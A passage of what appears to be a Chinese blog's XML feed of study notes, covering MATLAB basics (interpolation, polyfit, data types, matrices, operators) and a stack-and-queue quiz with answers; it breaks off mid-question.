线性插值，默认方法。将与插值点靠近的两个数据点用直线连接，然后在直线上选取对应插值点的数据。</li><li>nearest:    最近点插值。选择最近样本点的值作为插值数据。</li><li>pchip:    分段3次埃尔米特抽值。米用分段三次多项式，乐满疋插值条件，还需满足在若干节点处相邻段插值函数的一阶导数相等，使得曲线光滑的同时，还具有保形性。</li><li>spline:     3次样条插值。每个分段内构造一个三次多项式，使其插值函数除满足插值条件外，还要求在各节点处具有连续的一阶和二阶导数。</li></ol><p>多项式次数并非越高越好。次数越高，越容易产生震荡而偏离原函数，这种现象称为龙格(Runge）现象。</p><h4 id="四种方法的比较："><a href="#四种方法的比较：" class="headerlink" title="四种方法的比较："></a>四种方法的比较：</h4><p>线性插值和最近点插值方法比较简单。其中线性插值方法的计算量与样本点n无关。n越大，误差越小。<br>3次埃尔米特插值和3次样条插值都能保证曲线的光滑性。相比较而言,3次埃尔米特插值具有保形性;而3次样条插值要求其二阶导数也连续,所以插值函数的性态更好。</p><p><strong>interp2( ):    二维插值函数</strong></p><p>调用格式:     <strong>Z1=interp2(X,Y,Z,X1,Y1,method)</strong></p><p>其中，X、Y是两个向量，表示两个参数的采样点,Z是采样点对应的函数值。X1、YI是两个标量或向量，表示要插值的点。</p><p>数据插值能够根据已知数据推算未知数据，这使得人们解决问题的能力得到了拓展和延伸。</p><h2 id="曲线拟合-plotfit"><a href="#曲线拟合-plotfit" class="headerlink" title="曲线拟合(plotfit)"></a>曲线拟合(plotfit)</h2><p>插值要求逼近函数在采样点的数值与原函数相等，然而在实验中，测量的数据不一定准确，如果强求逼近函数过样本点，显然是不合理的。使用曲线拟合可以避免这种情况。</p><h3 id="曲线拟合的原理"><a href="#曲线拟合的原理" class="headerlink" title="曲线拟合的原理"></a>曲线拟合的原理</h3><p><img src="https://shierjinghuang.github.io/2022/01/10/Matlab/29.png"></p><p><img src="https://shierjinghuang.github.io/2022/01/10/Matlab/30.png"></p><h3 id="曲线拟合的实现方法"><a href="#曲线拟合的实现方法" class="headerlink" title="曲线拟合的实现方法"></a>曲线拟合的实现方法</h3><p><strong>polyfit( ):多项式拟合函数</strong>     函数功能:求得最小二乘拟合多项式系数。</p><p>调用格式:</p><ol><li>P=polyfit(X,Y,m)</li><li>[P,S]=polyfit(X,Y,m)</li><li>[P,S,mu]=polyfit(X,Y,m)</li></ol><p>根据样本数据X和Y，产生一个m次多项式P及其在采样点误差数据S，mu是一个二元向量，mu(l)是mean(X),而mu(2)是std(X)。</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
            <tag> Matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Matlab入门(一)</title>
      <link href="/2022/01/10/Matlab/"/>
      <url>/2022/01/10/Matlab/</url>
      
        <content type="html"><![CDATA[<h2 id="Matlab入门（一）"><a href="#Matlab入门（一）" class="headerlink" title="Matlab入门（一）"></a>Matlab入门（一）</h2><p>[TOC]</p><h3 id="1-Matlab系统环境"><a href="#1-Matlab系统环境" class="headerlink" title="1.Matlab系统环境"></a>1.Matlab系统环境</h3><p><strong>Matlab主窗口：</strong></p><p><strong>功能区：</strong>提供三个选项卡（主页，绘图，应用程序），各自有不同的工具可供使用；<strong>快速访问工具栏</strong>：包含一些常用按钮；<strong>当前文件夹工具栏</strong>：用于实现当前文件夹的操作。一定要先建立文件再将其设为工作文件夹。</p><p><strong>命令行窗口</strong></p><p>命令行窗口用于输入命令并显12示命令的执行结果。在命令提示符$&gt;&gt;$后输入命令并按下回车键，Matlab就会解释执行输入的命令并显示结果。如果命令行很长可以在第一个命令行后面加三个小数点…在下一回继续输入命令的其他部分，这三个…称为<strong>续行符</strong>，用于将下一行的命令视为这一行命令的逻辑相连。</p><ol><li><p>使用path命令设置文件搜索路径。例如：&gt;&gt;path(path,’e:\work’)    </p></li><li><p>用对话框设置文件搜索路径。</p><p>注：当前文件夹与搜索路径文件夹下均有同名m文件，会执行当前文件夹下的m文件。</p></li></ol><p><strong>工作区窗口：</strong> 是Matlab用于存储各种变量和结果的空间，可用于变量的显示和操作。在工作区以表格形式显示变量a与x的名称，取值等信息。在工作区还可以对变量进行保存、编辑、删除等操作。</p><p><strong>设置文件搜索路径</strong></p><p>MATLAB是在当前文件夹与搜索路径文件夹中寻找这个文件并执行文件内容的，所以要执行的文件必须放在这两类文件夹中。</p><ol><li><p>使用<code>path命令</code>设置文件搜索路径。例如：&gt;&gt;path(path,’e:\work’)    </p></li><li><p>用对话框设置文件搜索路径。</p><p>注：当前文件夹与搜索路径文件夹下均有同名m文件，会执行当前文件夹下的m文件。</p></li></ol><h3 id="2-Matlab的数值数据"><a href="#2-Matlab的数值数据" class="headerlink" title="2.Matlab的数值数据"></a>2.Matlab的数值数据</h3><p>**整型 : **</p><p>无符号整数:无符号8位整数、无符号16位整数、无符号32位整数、无符号64位整数.带符号整数:带符号8位整数、带符号16位整数、带符号32位整数、带符号64位整数。</p><p><strong>浮点型：</strong></p><p>在使用强制类型转化时，如x=int8(129)此时，x只会被置为int8(带符号数)的最大值127.</p><p>例如，uint8函数将数值数据转换为无符号8位整数，int8函数将数值数据转换为带符号8位整数。</p><p>浮点型数据分为单精度型和双精度类型，单精度型实数在内存中占用4个字节，而双精度型实数在内存中占用8个字节，所以双精度型的数据精度更高。</p><p>single函数:将其他类型的数据转换为单精度型。</p><p>double函数:将其他类型的数据转换为双精度型。</p><p>class函数可以得到参数的数据类型。</p><p>复型数据包括实部和虚部两个部分，实部和虚部默认为双精度型，虚数单位用i或|来表示。</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"><span class="token function">real</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">%求复数的实部</span><span class="token function">imag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">%求复数的虚部</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>数值数据的输出格式</strong></p><p>Matlab可以用format函数设置数值数据的输出格式，</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab">format 格式符  <span class="token comment">% 设置数据的输出格式</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不同的格式符输出不同的数据格式，同时format命令只是影响数据输出的格式，而不影响数据的计算和存储。</p><h4 id="常用数学函数"><a href="#常用数学函数" class="headerlink" title="常用数学函数"></a>常用数学函数</h4><p>（1）函数的调用格式为：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">函数名（函数自变量的值）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>函数的自变量规定为矩阵变量（标量本身是矩阵的一种特例）。<br><strong>函数在运算时是将函数逐项作用于矩阵的每个元素上</strong>，所以最后运算的结果就是一个与自变量同型的矩阵。</p><p>常用函数</p><p>三角函数有以弧度为单位的函数和以角度为单位的函数,如果是以角度为单位的函数就在函数名后面加“d”，以示区别。</p><p>abs函数可以求实数的绝对值、复数的模、字符串的ASClI码值。</p><p>用于取整的函数有fix、floor、ceil、round。round函数按照四舍五入的规则取整。ceil函数是向上取整，取大于等于这个数的第一个整数。floor函数是向下取整，取小于等于这个数的第一个整数。fix函数是固定取靠近0的那个整数,即舍去小数取整。</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"><span class="token function">isprime</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> # 判断n是否是素数，是返回<span class="token number">1</span>，否返回<span class="token number">0.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-变量及其操作"><a href="#3-变量及其操作" class="headerlink" title="3.变量及其操作"></a>3.变量及其操作</h3><p>计算机处理的数据都是存放在内存单元中的，而每一个内存单元都有一个唯一的地址，程序就是通过这个地址来访问对应内存单元的。<br>在如Matlab这种高级语言中，只需要给每个内存单元取一个名字，然后通过这个名字就能访问每个内存单元了。</p><h4 id="变量与赋值语句"><a href="#变量与赋值语句" class="headerlink" title="变量与赋值语句"></a>变量与赋值语句</h4><ul><li>变量本质上讲是内存单元的一个抽象</li><li>在Matlab中，变量名是以字母开头，后接字母、数字或下划线的字母序列，最多63个字符。</li></ul><p>赋值语句两种格式</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">变量<span class="token operator">=</span>表达式        % 变量结果会在命令行中显示出来变量<span class="token operator">=</span>表达式；  % 变量结果不会在命令行中显示出来<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Matlab语言还有一些预定义的变量，预定义变量是由系统本身定义的变量。如ans是默认赋值变量，i和j代表虚数单位，pi代表圆周率，NaN代表非数。</p><h4 id="变量的删除和修改（who-whos）"><a href="#变量的删除和修改（who-whos）" class="headerlink" title="变量的删除和修改（who,whos）"></a>变量的删除和修改（who,whos）</h4><p>在工作区选择变量右击即可进行删除和修改。<br>who命令和whos命令：<br>who命令只显示已存在变量的名称。而whos显示包括变量类型，长度等信息。</p><h4 id="内存变量文件-save-load"><a href="#内存变量文件-save-load" class="headerlink" title="内存变量文件(save,load)"></a>内存变量文件(save,load)</h4><p>用于保存Matlab工作区变量的文件叫做内存变量文件，其扩展名为.mat，也叫MAT文件，是一种标准的二进制格式文件。<br><strong>save命令：创建内存变量文件</strong>                                                               <strong>load命令：载入内存变量文件</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">save mydata a x   % 将a x保存在mydata.mat文件中load mydata       % 载入mydata.mat中的变量<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="4-MATLAB矩阵表示"><a href="#4-MATLAB矩阵表示" class="headerlink" title="4.MATLAB矩阵表示"></a>4.MATLAB矩阵表示</h3><h4 id="矩阵的建立"><a href="#矩阵的建立" class="headerlink" title="矩阵的建立"></a>矩阵的建立</h4><p><img src="https://shierjinghuang.github.io/2022/01/10/Matlab/1.png"></p><p><img src="https://shierjinghuang.github.io/2022/01/10/Matlab/2.png"></p><p><img src="https://shierjinghuang.github.io/2022/01/10/Matlab/3.png"></p><h4 id="冒号表达式："><a href="#冒号表达式：" class="headerlink" title="冒号表达式："></a>冒号表达式：</h4><p>1 用冒号产生行向量t：</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab">t<span class="token operator">=</span><span class="token number">0</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">5</span> <span class="token comment">%格式为： 初始值：步长：终止值</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2 用linspace函数产生行向量x:</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab">x<span class="token operator">=</span><span class="token function">linspace</span><span class="token punctuation">(</span>a<span class="token operator">:</span>b<span class="token operator">:</span>n<span class="token punctuation">)</span><span class="token comment">%(第一个元素：第二个元素：总数)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果n忽略不写则自动生成100个数据。</p><h4 id="结构矩阵和单元矩阵"><a href="#结构矩阵和单元矩阵" class="headerlink" title="结构矩阵和单元矩阵"></a>结构矩阵和单元矩阵</h4><p><strong>结构矩阵：</strong></p><p>   在实际应用中，经常会遇到不同类型的数据项组成的实体，例如一个学生的数据实体就包括了年龄，姓名，学号，这些数据是相互联系的。结构数据类型就可以把这些数据类型不同但逻辑上相关的数据组成一个有机的整体。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">结构矩阵元素.成员名<span class="token operator">=</span>表达式<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>单元矩阵：</strong></p><p>单元数据类型，也是把不同的数据放在一个变量中，但与结构矩阵所不同的是，结构矩阵的各个元素下还有成员，每个成员都有自己的名字，而单元矩阵的各个元素就是不同类型的数据，每个元素直接由不同类型的数据组成。</p><h3 id="5-矩阵元素的引用"><a href="#5-矩阵元素的引用" class="headerlink" title="5.矩阵元素的引用"></a>5.矩阵元素的引用</h3><p><strong>1 通过下标来引用矩阵的元素</strong></p><p><strong>2 通过序号来引用：</strong>在MATLAB中，矩阵元素按列存储，即首先存储矩阵的第一列元素，然后存储第二列元 素，一直到矩阵的最后一列元素。矩阵元素的序号就是矩阵元素在内存中的排列顺序。</p><p> 序号与下标是一—对应的，以m×n矩阵A为例，矩阵元素A(i.j)的序号为(j-1)×m+i。矩阵元素的序号与下标可以利用sub2ind和ind2sub函数实现相互转换。<br>sub2ind函数:将矩阵中指定元素的行、列下标转换成存储的序号。调用格式为:</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab">D<span class="token operator">=</span><span class="token function">sub2ind</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span>I<span class="token punctuation">,</span>J<span class="token punctuation">)</span><span class="token comment">%  S行数和列数组成的向量  I转换矩阵元素的行下标  J转换矩阵元素的列下标</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ind2ind函数:将矩阵元素的序号转换成对应的下标，调用格式为:</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"><span class="token punctuation">[</span>I<span class="token punctuation">,</span>J<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">ind2sub</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span>D<span class="token punctuation">)</span><span class="token comment">% I行下标 J列下标 S行数和列数组成的向量 D序号</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>3 利用冒号表达式获得子矩阵(end)</strong></p><p>子矩阵是指由矩阵中一部分元素构成的矩阵。</p><p><img src="https://shierjinghuang.github.io/2022/01/10/Matlab/4.png"></p><p>end运算符：表示某一维的末尾元素下标</p><p>可以利用空矩阵删除矩阵的元素，</p><p><strong>4.改变矩阵的形状(reshape)</strong></p><p>在矩阵<strong>总元素保持不变</strong>的前提下，将矩阵A重新排成$m*n$的二维矩阵。</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"><span class="token function">reshape</span> <span class="token punctuation">(</span>A<span class="token punctuation">,</span>m<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意：reshape函数只是改变原矩阵的行数和列数，但并不改变原矩阵元素个数及其存储顺序。</p><p>A(:)将矩阵A的每一列元素堆叠起来成为一个列向量。</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"><span class="token function">A</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">)</span>等价于 <span class="token function">reshape</span><span class="token punctuation">(</span>A<span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="6-Matlab基本运算"><a href="#6-Matlab基本运算" class="headerlink" title="6.Matlab基本运算"></a>6.Matlab基本运算</h3><h4 id="6-1算数运算"><a href="#6-1算数运算" class="headerlink" title="6.1算数运算"></a>6.1算数运算</h4><h5 id="基本算数运算"><a href="#基本算数运算" class="headerlink" title="基本算数运算"></a>基本算数运算</h5><p> 基本算术运算符:<strong>＋（加）、—（减）、*（乘）</strong> <strong>/（左除） \（右除）^乘方</strong><br>MATLAB的算术运算是在矩阵意义下进行的。单个数据的算术运算只是矩阵运算的一种特例。</p><p>**加减运算:**若两矩阵同型，则运算时两矩阵的相应元素相加减。若两矩阵不同型，则MATLAB将给出错误信息,一个标量也可以和矩阵进行加减运算，这时把标量和矩阵的每一个元素进行加减运算. </p><p><strong>乘法运算：</strong>矩阵A和B进行乘法运算，要求A的列数与B的行数相等，此时则称A、B矩阵是可乘的，或称A和B两矩阵维数和大小相容。如果两者的维数或大小不相容，则将给出错误信息，提示用户两个矩阵是不可乘的。 </p><p><strong>除法运算：</strong>在<strong>MATLAB</strong>中，有两种矩阵除法运算:右除/和左除\。如果A矩阵是非奇异方阵，则B/A等效于B * inv(A)，A\B等效于inv(A) * B。对于矩阵来说，右除和左除表示两种不同的除数矩阵和被除数矩阵关系。</p><pre class="line-numbers language-none"><code class="language-none">左除： A &#x2F; B &#x3D; A * B ^ -1右除： A \ B &#x3D; A ^ -1 * B<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>乘方运算：</strong>一个矩阵的乘方运算可以表示成A^x，要求A为方阵，x为标量。</p><h5 id="点运算"><a href="#点运算" class="headerlink" title="点运算"></a>点运算</h5><p>**点运算:**两矩阵进行点运算是指它们的对应元素进行相关运算，要求两矩阵同型。Matlab中的点运算，就是对矩阵中的元素一一运算，基本的点运算有点乘、点除、点幂。</p><p><img src="https://shierjinghuang.github.io/2022/01/10/Matlab/5.png"></p><center>（点运算与算数运算的区别）</center>.* 点乘 ：将每个元素乘以一个数。<p>./ (左点除) ：将每个元素除以一个数或者矩阵。如A ./ B A,B对应元素相除。(在点除的时候需要保证矩阵形式相同)</p><p>.\ (右点除) : </p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab">A<span class="token operator">.\</span><span class="token number">3</span> <span class="token comment">%3除以A中对应元素</span>A<span class="token operator">.\</span> B<span class="token comment">%用每一个元素分别对应除以矩阵中的元素。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>.^(点幂) ：</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab">A<span class="token operator">.^</span><span class="token number">1.2</span> <span class="token comment">%A中每个元素的1.2次方</span>A<span class="token operator">.^</span>B   <span class="token comment">%A中每个元素作为底数，B中对应元素作为次数，进行幂运算</span><span class="token number">3.</span><span class="token operator">^</span>B   <span class="token comment">%以3为底、B中元素为次数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Matlab用%表示注释。</p><h4 id="6-2-关系运算"><a href="#6-2-关系运算" class="headerlink" title="6.2 关系运算:"></a>6.2 关系运算:</h4><p>&lt;(小于)、&lt;=(小于或等于)、&gt;(大于)、&gt;=(大于或等于)、==(等于)、~=(不等于)。<br>当两个比较量是标量时，直接比较两数的大小。若关系成立，关系表达式结果为1，否则为0。<br>当参与比较的量是两个同型的矩阵时，比较是对两矩阵相同位置的元素按标量关系运算规则逐个进行，最终的关系运算的结果是一个与原矩阵同型的矩阵，它的元素由0或1组成。当参与比较的一个是标量，而另一个是矩阵时则把标量与矩阵的每一个元素按标量关系运算规则逐个比较，最终的关系运算的结果是一个与原矩阵同型的矩阵，它的元素由0或1组成。</p><h4 id="6-3-逻辑运算"><a href="#6-3-逻辑运算" class="headerlink" title="6.3 逻辑运算"></a>6.3 逻辑运算</h4><p>:&amp;(与)、I(或)和～(非)。<br>设参与逻辑运算的是两个标量a和b，那么运算规则为:a&amp;b a、b全为非零时，运算结果为1，否则为0。alb a、b中只要有一个为非零时，运算结果为1。~a当a为零时，运算结果为1;当a为非零时，运算结果为0。</p><p> 在算术运算、关系运算和逻辑运算中，算术运算的优先级最高，逻辑运算优先级最低，但逻辑非运算是单目运算，它的优先级比双目运算要高。<strong>单目是涉及一个元素的运算，双目是涉及两个的运算</strong>。<br>若参与逻辑运算的是两个同型矩阵，那么将对矩阵相同位置上的元素按标量规则逐个进行运算，最终运算结果是一个与原矩阵同型的矩阵，其元素由1或0组成。若参与逻辑运算的一个是标量，一个是矩阵，那么将在标量与矩阵中的每个元素之间按标量规则逐个进行运算，最终运算结果是一个与原矩阵同型的矩阵,其元素由1或0组成。</p><h3 id="7-Matlab中的-m文件"><a href="#7-Matlab中的-m文件" class="headerlink" title="7.Matlab中的.m文件"></a>7.Matlab中的.m文件</h3><p>.m文件分为两类 </p><ol><li><p>脚本文件，不传参数只执行计算等功能。</p><p>脚本文件只是一个计算模块，保存文件名时可以在满足命名规则的基础上任意命名。</p></li><li><p>函数文件，需要传参数，返回计算结果。</p><p>函数文件必须以关键字function开头，一般需要传参数和返回值，在保存是必须以函数名作为文件名保存。</p><p>注意在调用自己编写的函数时，调用的函数与被调用的函数必须放在同一文件夹下</p></li><li><p>脚本文件和函数文件可以相互转换</p></li></ol><h3 id="8-Matlab中的基本语句"><a href="#8-Matlab中的基本语句" class="headerlink" title="8.Matlab中的基本语句"></a>8.Matlab中的基本语句</h3><h4 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h4><ol><li>格式1 if end条件语句</li><li>格式2 if else end 条件语句</li><li>格式3 if else elseif end 条件语句</li><li>switch语句，适用于有更多选项的程序。</li><li>try语句try语句尝试执行语句1，如果在执行过程中出现错误，则转去执行语句组2.</li></ol><h4 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h4><ol><li>for-end循环，for循环变量由初值，步长和终值决定，内部为循环体语句。for语句更一般的格式为 for 循环变量=矩阵表达式，然后执行循环体语句直到各列元素处理完毕。</li></ol><p>蒙特卡罗方法求概率，用随机数模拟实际过程的方法。</p><p>二分法求根的编程思路1,定义求根的函数2,主函数使用while循环比较合适。</p><p>Matlab中的数组下标是从1开始的。</p><p>Matlab以矩阵或向量为元素进行运算，可以减少循环，从而减少运行时间,点运算是Matlab的特点</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
            <tag> Matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构 第七章查找技术</title>
      <link href="/2021/12/16/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%83%E7%AB%A0%20%E6%9F%A5%E6%89%BE%E6%8A%80%E6%9C%AF/"/>
      <url>/2021/12/16/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%83%E7%AB%A0%20%E6%9F%A5%E6%89%BE%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构 第三章栈和队列</title>
      <link href="/2021/12/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/"/>
      <url>/2021/12/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h1 id="判断题"><a href="#判断题" class="headerlink" title="判断题"></a>判断题</h1><ol><li>若一个栈的输入序列为1，2，3，…，N，输出序列的第一个元素是i，则第j个输出元素是j−i−1。   (F)<ul><li>栈的运算遵循后入先出的原则，输出的第一个是i，则第j个输出的应该是第i-j+1个元素。</li></ul></li><li>所谓“循环队列”是指用单向循环链表或者循环数组表示的队列。   (F)<ul><li>循环队列：队列采用顺序存储，并且数组是头尾相接的循环结构</li></ul></li><li>在对不带头结点的链队列作出队操作时，不会改变头指针的值。   (F)<ul><li>会改变，头指针变为相连的指针；</li></ul></li><li><h2 id="不论是入队列操作还是入栈操作-在顺序存储结构上都需要考虑”溢出”情况。-T"><a href="#不论是入队列操作还是入栈操作-在顺序存储结构上都需要考虑”溢出”情况。-T" class="headerlink" title="不论是入队列操作还是入栈操作,在顺序存储结构上都需要考虑”溢出”情况。   (T)"></a>不论是入队列操作还是入栈操作,在顺序存储结构上都需要考虑”溢出”情况。   (T)</h2></li><li>队列和栈都是运算受限的线性表，只允许在表的两端进行运算。  (F)<ul><li>队列在只允许在一端插入，在另一端删除，而队列只能在同一端进行操作。</li></ul></li><li>栈和队列的存储方式，既可以是顺序方式，也可以是链式方式。 </li><li>循环队列也存在着空间溢出问题。    (T)<ul><li>循环队列解决的是假溢出问题，由于循环队列的大小是固定的，仍会出现真溢出。</li></ul></li><li>循环队列执行出队操作时会引起大量元素的移动。 </li><li>栈是插入和删除只能在一端进行的线性表；队列是插入在一端进行，删除在另一端进行的线性表。 </li><li>在n个元素连续进栈以后，它们的出栈顺序和进栈顺序一定正好相反。 </li><li>环形队列中有多少个元素可以根据队首指针和队尾指针的值来计算。 </li><li>栈和队列的插入和删除操作特殊，所以，栈和队列是非线性结构。     (F)<ul><li>栈和队列都是运算受限的线性表。</li></ul></li><li>序列{1,2,3,4,5}依次入栈，则不可能得到{3,4,1,2,5}的出栈序列。   (T)<ul><li>由题1,2,3,4,5依次入栈，所以在第一个3出栈的时候1,2均已经入栈，又由于栈的运算遵循后入先出，2会比1更先出栈，故{3,4,1,2,5}的出栈序列不可能出现。</li></ul></li><li>队列中允许插入的一端叫队头，允许删除的一端叫队尾。     （F)</li></ol><h2 id="选择题"><a href="#选择题" class="headerlink" title="选择题"></a>选择题</h2><ol><li><p>若用大小为6的数组来实现循环队列，且当前<code>front</code>和<code>rear</code>的值分别为0和4。当从队列中删除两个元素，再加入两个元素后，<code>front</code>和<code>rear</code>的值分别为多少？   (A)</p><p>A.2和0            B.2和2            C.2和4       D.2和6</p><ul><li>有已知得，<code>front</code>和<code>rear</code>的值分别为0和4，又数组大小为6，所以值的范围为[0,5],先删除两个元素，在添加两个元素，<code>front</code>与<code>rear</code>的值分别加2，为2,0.</li></ul></li><li><p>如果循环队列用大小为<code>m</code>的数组表示，且用队头指针<code>front</code>和队列元素个数<code>size</code>代替一般循环队列中的<code>front</code>和<code>rear</code>指针来表示队列的范围，那么这样的循环队列可以容纳的元素个数最多为： </p><p>A.m-1           B. m           C.m+1           D.不能确定</p></li><li><p>以下数据结构中，（ ）是非线性数据结构。 (A)</p><p>A.树                B.字符串                C.队列                D.栈</p></li><li><p>设栈S和队列Q的初始状态均为空，元素{1, 2, 3, 4, 5, 6, 7}依次进入栈S。若每个元素出栈后立即进入队列Q，且7个元素出队的顺序是{2, 5, 6, 4, 7, 3, 1}，则栈S的容量至少是：(D) </p><p>A.1             B.2             C.3             D.4</p><ul><li>由题出栈顺序是2,5,6,4,7,3,1而入栈顺序是顺序，则在5出栈前栈内至少含有1,3,4,5,四个数据，由此栈的大小至少为4</li></ul></li><li><p>线性表、堆栈、队列的主要区别是什么？     (B)</p><p>A.线性表用指针，堆栈和队列用数组</p><p>B.堆栈和队列都是插入、删除受到约束的线性表</p><p>C.线性表和队列都可以用循环链表实现，但堆栈不能</p><p>D.堆栈和队列都不是线性结构，而线性表是</p></li><li><p>栈和队列的共同点( )。  (C)</p><p>A.都是先进先出                                          B.都是后进先出</p><p>C.只允许在端点处插入和删除元素           D.没有共同点</p></li><li><p>下列关于线性表,栈和队列叙述,错误的是( )。                      (A)</p><p>A.线性表是给定的n(n必须大于零)个元素组成的序列</p><p>B.线性表允许在表的任何位置进行插入和删除操作</p><p>C.栈只允许在一端进行插入和删除操作</p><p>D.队列只允许在一端进行插入一端进行删除</p></li><li><p>设用一个数组A[1……N]来存储一个栈，令A[N]为栈底，用整型变量T指示当前栈顶位置，A[T]为栈顶元素。当从栈中弹出一个元素时，变量T的变化为（ ）。 </p></li><li><p>链式栈与顺序栈相比，一个比较明显的优点是（ ）。 (B)</p><p>A.插入操作更加方便                                           B.通常不会出现栈满的情况</p><p>C.不会出现栈空的情况                                       D.删除操作更加方便</p></li><li><p>在循环顺序队列中，假设以少用一个存储单元的方法来区分队列判满和判空的条件，front和rear分别为队首和队尾指针，它们分别指向队首元素和队尾元素的下一个存储单元，队列的最大存储容量为maxSize，则队列的长度是（ ）。 </p></li><li><p>设栈S和队列Q的初始状态为空，元素e1、e2、e3、e4、e5、e6依次通过栈S，一个元素出栈后即进入队列Q，若6个元素出队的顺序是e2、e4、e3、e6、e5、e1，则栈S的容量至少应该是（　　 ）。<strong>提示：对于栈，可以全进再依次出；也可以进一个出一个；也可以进一部分，出一个，再进一部分；但是出栈之后，不能再入栈</strong>。       (A)</p><p>A.3           B.4           C.6           D.2</p></li><li><p>关于栈和队列的下列说法正确的是（）     (B)</p><p>A.栈的插入操作是在栈顶进行，插入时需将栈内所有元素后移；</p><p>B.栈是后进先出的结构，出栈时除了栈顶元素，其余元素无需移动；</p><p>C.循环队列的出队操作删除的是队头元素，采用循环队列存储时，其余队列元素均需要移动；</p><p>D.链队列的入队操作在表尾进行，操作时间与队列长度成正比</p></li><li><p>一个栈的入栈序列是a,b,c,d,e，则栈的出栈序列不可能的是（ ）。 C</p><p>A.edcba                     B.decba                     C.dceab                     D.abcde</p></li><li><p>在一个链表表示的队列中， f和r分别指向队列的头和尾。下列哪个操作能正确地将s结点插入到队列中：  (B)</p><p>A.f-&gt;next=s; f=s;                     B.r-&gt;next=s; r=s;</p><p>C.s-&gt;next=r; r=s;                     D.s-&gt;next=f; f=s;</p></li><li><p>栈和队列具有相同的。 (B)</p><p>A.抽象数据类型           B.逻辑结构           C.存储结构           D.运算</p></li><li><p>假定利用数组a[n]顺序存储一个栈，用top表示栈顶指针，用top==-1表示栈空，并已知栈未满，当元素x进栈时所执行的操作为（C）。 </p><p>A.a[–top]=x           B.a[top–]=x           C.a[++top]=x           D.a[top++]=x</p></li><li><p>队列的“先进先出”特性是指（B）。</p><p>Ⅰ.最后插入队列中的元素总是最后被删除<br>Ⅱ.当同时进行插入、删除操作时，总是插入操作优先<br>Ⅲ.每当有删除操作时，总要先做一次插入操作<br>Ⅳ.每次从队列中删除的总是最早插入的元素</p><p>A.Ⅰ       B.Ⅰ、Ⅳ       C.Ⅱ、Ⅲ       D.Ⅳ</p></li><li><p>已知循环队列存储在一维数组A[0…n-1]中，且队列非空时front和rear分别指向队头元素和队尾元素。若初始时队列为空，且要求第一个进入队列的元素存储在A[0]处，则初始时front和rear的值分别是（　）。 </p></li><li><p>执行函数时，其局部变量一般采用（　）进行存储。 (C)</p><p>A.树形结构           B.静态链表           C.栈结构           D.队列结构</p></li><li><p>对空栈 <em>S</em> 进行 Push 和 Pop 操作，入栈序列为 a, b, 